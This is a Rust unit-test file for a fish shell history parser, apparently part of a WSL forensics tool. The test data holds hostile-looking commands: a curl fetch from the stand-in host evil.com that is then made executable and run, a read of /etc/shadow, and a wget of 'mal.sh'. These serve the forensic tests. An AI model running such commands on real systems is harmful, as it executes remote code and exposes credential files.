//! RED tests for fish shell history parser.
//!
//! Fish history format (fish_history): YAML-like blocks.
//!   - cmd: <command>
//!     when: <unix timestamp>
//!     paths:
//!       - <path>

use issen_wsl::fish_history::{FishHistoryEntry, parse_fish_history};

// ── Test 1: empty input returns empty vec ─────────────────────────────────────

#[test]
fn parse_empty_returns_empty() {
    let entries = parse_fish_history(b"");
    assert!(entries.is_empty());
}

// ── Test 2: single command parsed ────────────────────────────────────────────

#[test]
fn parse_single_command() {
    let input = b"- cmd: ls -la\n  when: 1716000000\n";
    let entries = parse_fish_history(input);
    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].command, "ls -la");
    assert_eq!(entries[0].when_unix, Some(1_716_000_000));
}

// ── Test 3: command without timestamp ────────────────────────────────────────

#[test]
fn parse_command_without_timestamp() {
    let input = b"- cmd: echo hello\n";
    let entries = parse_fish_history(input);
    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].command, "echo hello");
    assert_eq!(entries[0].when_unix, None);
}

// ── Test 4: multiple commands ─────────────────────────────────────────────────

#[test]
fn parse_multiple_commands() {
    let input = b"- cmd: curl http://evil.com/payload\n  when: 1716000001\n- cmd: chmod +x payload\n  when: 1716000002\n- cmd: ./payload\n  when: 1716000003\n";
    let entries = parse_fish_history(input);
    assert_eq!(entries.len(), 3);
    assert_eq!(entries[0].command, "curl http://evil.com/payload");
    assert_eq!(entries[1].command, "chmod +x payload");
    assert_eq!(entries[2].command, "./payload");
}

// ── Test 5: paths field collected ────────────────────────────────────────────

#[test]
fn parse_paths_collected() {
    let input = b"- cmd: cat /etc/shadow\n  when: 1716000100\n  paths:\n    - /etc/shadow\n";
    let entries = parse_fish_history(input);
    assert_eq!(entries.len(), 1);
    assert!(entries[0].paths.contains(&"/etc/shadow".to_string()));
}

// ── Test 6: ordering is preserved ────────────────────────────────────────────

#[test]
fn parse_ordering_preserved() {
    let input = b"- cmd: first\n  when: 100\n- cmd: second\n  when: 200\n- cmd: third\n  when: 300\n";
    let entries = parse_fish_history(input);
    assert_eq!(entries[0].command, "first");
    assert_eq!(entries[1].command, "second");
    assert_eq!(entries[2].command, "third");
}

// ── Test 7: extra whitespace is trimmed ──────────────────────────────────────

#[test]
fn parse_trims_command_whitespace() {
    let input = b"- cmd:   ls   \n  when: 1716000000\n";
    let entries = parse_fish_history(input);
    assert_eq!(entries[0].command, "ls");
}

// ── Test 8: file path parser ─────────────────────────────────────────────────

#[test]
fn parse_from_bytes_matches_string_parse() {
    let content = "- cmd: wget https://example.com/mal.sh\n  when: 1716000999\n";
    let a = parse_fish_history(content.as_bytes());
    assert_eq!(a.len(), 1);
    assert_eq!(a[0].when_unix, Some(1_716_000_999));
}
